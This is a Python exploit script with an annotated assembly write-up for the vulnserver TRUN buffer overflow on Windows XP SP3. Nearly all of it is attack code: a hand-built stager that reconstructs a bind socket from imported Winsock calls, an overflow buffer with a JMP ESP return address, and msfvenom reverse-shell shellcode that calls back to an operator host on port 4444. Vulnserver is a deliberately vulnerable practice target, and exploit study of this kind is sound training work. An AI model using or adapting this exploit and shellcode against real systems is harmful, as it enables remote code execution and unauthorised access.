'''vulnserver TRUN buffer overflow reverse shell
 using >> socket reconstruction.
Tested on :  windows XP 32 bit SP3

Author : Goutham Madhwaraj (barriersec.com)
'''

'''

required syscalls:


0040257C  -FF25 FC614000    JMP DWORD PTR DS:[<&WS2_32.socket>]      ; WS2_32.socket

00402564  -FF25 D8614000    JMP DWORD PTR DS:[<&WS2_32.bind>]        ; WS2_32.bind

00402554  -FF25 F0614000    JMP DWORD PTR DS:[<&WS2_32.listen>]      ; WS2_32.listen

0040254C  -FF25 D4614000    JMP DWORD PTR DS:[<&WS2_32.accept>]      ; WS2_32.accept

0040252C  -FF25 F4614000    JMP DWORD PTR DS:[<&WS2_32.recv>]        ; WS2_32.recv

-------------------------------------------------------------------------------------------------------------------------------

stager 1 : 88 bytes
socket : socket(2, 1, 6)

"\x83\xEC\x40\x33\xC0\xB0\x06\x50\xB0\x01\x50\x40\x50\xBB\x77\x7C\x25\x40\xC1\xEB\x08\xFF\xD3\x8B\xF8"  (25 bytes)

00B8FA21   83EC 40          SUB ESP,40 #for moving away from EIP

00B8FA24   33C0             XOR EAX,EAX
00B8FA26   B0 06            MOV AL,6
00B8FA28   50               PUSH EAX
00B8FA29   B0 01            MOV AL,1
00B8FA2B   50               PUSH EAX
00B8FA2C   40               INC EAX
00B8FA2D   50               PUSH EAX
00B8FA2E   BB 777C2540      MOV EBX,40257C77
00B8FA33   C1EB 08          SHR EBX,8
00B8FA36   FFD3             CALL EBX
00B8FA38   8BF8             MOV EDI,EAX

-----------------------------------------------------------------------------

bind : bind(socket handle,socket addr struct,10)

"\x33\xC0\x50\x50\x54\x59\xC6\x01\x02\xC6\x41\x03\x16\x6A\x10\x51\xB3\x64\x57\xFF\xD3"        (21 bytes)

00B8FA3A   33C0             XOR EAX,EAX
00B8FA3C   50               PUSH EAX
00B8FA3D   50               PUSH EAX
00B8FA3E   54               PUSH ESP
00B8FA3F   59               POP ECX
00B8FA40   C601 02          MOV BYTE PTR DS:[ECX],2
00B8FA43   C641 03 14       MOV BYTE PTR DS:[ECX+3],14 #listen on port 20
00B8FA47   6A 16            PUSH 16
00B8FA49   51               PUSH ECX
00B8FA4A   B3 64            MOV BL,64
00B8FA4C   57               PUSH EDI
00B8FA4D   FFD3             CALL EBX

-------------------------------------------------------------------------------

Listen :

"\xB3\x54\x6A\x7F\x57\xFF\xD3"   ( 7 bytes )

00B8FA4F   B3 54            MOV BL,54
00B8FA51   6A 7F            PUSH 7F
00B8FA53   57               PUSH EDI
00B8FA54   FFD3             CALL EBX

--------------------------------------------------------------------------------

accept : accept(socket, NULL, NULL)

"\x50\x50\x57\xB3\x4C\xFF\xD3"   ( 7 bytes )

00B8FA56   50               PUSH EAX
00B8FA57   50               PUSH EAX
00B8FA58   57               PUSH EDI
00B8FA59   B3 4C            MOV BL,4C
00B8FA5B   FFD3             CALL EBX


--------------------------------------------------------------------------------

recv :

"\x8B\xF8\x33\xC0\x50\xB4\x02\x50\x54\x59\x66\x83\xC1\x5E\x66\x83\xC1\x5E\x66\x83\xC1\x10\x51\x57\xB3\x2C\xFF\xD3"  (28 bytes)

00B8FA5D   8BF8             MOV EDI,EAX
00B8FA5F   33C0             XOR EAX,EAX
00B8FA61   50               PUSH EAX
00B8FA62   B4 02            MOV AH,2
00B8FA64   50               PUSH EAX
00B8FA65   54               PUSH ESP
00B8FA66   59               POP ECX
00B8FA67   66:83C1 5E       ADD CX,5E
00B8FA6B   66:83C1 5E       ADD CX,5E
00B8FA6F   66:83C1 10       ADD CX,10
00B8FA73   51               PUSH ECX
00B8FA74   57               PUSH EDI
00B8FA75   B3 2C            MOV BL,2C
00B8FA77   FFD3             CALL EBX                                 ; <JMP.&WS2_32.recv>





'''

import os
import socket
import sys
from time import sleep

host= "192.168.0.101"
port= 9999



socket_call = "\x83\xEC\x40\x33\xC0\xB0\x06\x50\xB0\x01\x50\x40\x50\xBB\x77\x7C\x25\x40\xC1\xEB\x08\xFF\xD3\x8B\xF8"

bind_call = "\x33\xC0\x50\x50\x54\x59\xC6\x01\x02\xC6\x41\x03\x16\x6A\x10\x51\xB3\x64\x57\xFF\xD3"

listen_call = "\xB3\x54\x6A\x7F\x57\xFF\xD3"

accept_call = "\x50\x50\x57\xB3\x4C\xFF\xD3"

recv_call = "\x8B\xF8\x33\xC0\x50\xB4\x02\x50\x54\x59\x66\x83\xC1\x5E\x66\x83\xC1\x5E\x66\x83\xC1\x10\x51\x57\xB3\x2C\xFF\xD3"


#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00" -f c

rev_shell = (

"\xb8\xd4\x48\x2c\x12\xd9\xcd\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\x97\x46\xce\xe7\xeb\xbf\x8c"
"\x08\x13\x40\xf1\x81\xf6\x71\x31\xf5\x73\x21\x81\x7d\xd1\xce"
"\x6a\xd3\xc1\x45\x1e\xfc\xe6\xee\x95\xda\xc9\xef\x86\x1f\x48"
"\x6c\xd5\x73\xaa\x4d\x16\x86\xab\x8a\x4b\x6b\xf9\x43\x07\xde"
"\xed\xe0\x5d\xe3\x86\xbb\x70\x63\x7b\x0b\x72\x42\x2a\x07\x2d"
"\x44\xcd\xc4\x45\xcd\xd5\x09\x63\x87\x6e\xf9\x1f\x16\xa6\x33"
"\xdf\xb5\x87\xfb\x12\xc7\xc0\x3c\xcd\xb2\x38\x3f\x70\xc5\xff"
"\x3d\xae\x40\x1b\xe5\x25\xf2\xc7\x17\xe9\x65\x8c\x14\x46\xe1"
"\xca\x38\x59\x26\x61\x44\xd2\xc9\xa5\xcc\xa0\xed\x61\x94\x73"
"\x8f\x30\x70\xd5\xb0\x22\xdb\x8a\x14\x29\xf6\xdf\x24\x70\x9f"
"\x2c\x05\x8a\x5f\x3b\x1e\xf9\x6d\xe4\xb4\x95\xdd\x6d\x13\x62"
"\x21\x44\xe3\xfc\xdc\x67\x14\xd5\x1a\x33\x44\x4d\x8a\x3c\x0f"
"\x8d\x33\xe9\x80\xdd\x9b\x42\x61\x8d\x5b\x33\x09\xc7\x53\x6c"
"\x29\xe8\xb9\x05\xc0\x13\x2a\xea\xbd\x1b\xc2\x82\xbf\x1b\x03"
"\x0f\x49\xfd\x49\xbf\x1f\x56\xe6\x26\x3a\x2c\x97\xa7\x90\x49"
"\x97\x2c\x17\xae\x56\xc5\x52\xbc\x0f\x25\x29\x9e\x86\x3a\x87"
"\xb6\x45\xa8\x4c\x46\x03\xd1\xda\x11\x44\x27\x13\xf7\x78\x1e"
"\x8d\xe5\x80\xc6\xf6\xad\x5e\x3b\xf8\x2c\x12\x07\xde\x3e\xea"
"\x88\x5a\x6a\xa2\xde\x34\xc4\x04\x89\xf6\xbe\xde\x66\x51\x56"
"\xa6\x44\x62\x20\xa7\x80\x14\xcc\x16\x7d\x61\xf3\x97\xe9\x65"
"\x8c\xc5\x89\x8a\x47\x4e\xa9\x68\x4d\xbb\x42\x35\x04\x06\x0f"
"\xc6\xf3\x45\x36\x45\xf1\x35\xcd\x55\x70\x33\x89\xd1\x69\x49"
"\x82\xb7\x8d\xfe\xa3\x9d"



)



#625011af

buffer = 'TRUN .' +"A"*2006 + "\xaf\x11\x50\x62"+"\x90"*20+ socket_call+ bind_call+listen_call+accept_call+recv_call+"\x90"*(351-len(socket_call)-len(bind_call)-len(accept_call)-len(listen_call)-len(recv_call))+"\x90"*15+'\r\n'

final_payload = "\x90"*10 + rev_shell

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))

print conn.recv(1024)

print "sending stager 1 payload "
conn.send((buffer))

print "sleeping for few seconds..."
sleep(1)
print "connecting to bind socket on port 22.."

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect((host,22))
print "sending final payload ! set your netcat listener!"
con.send(final_payload)
con.close()


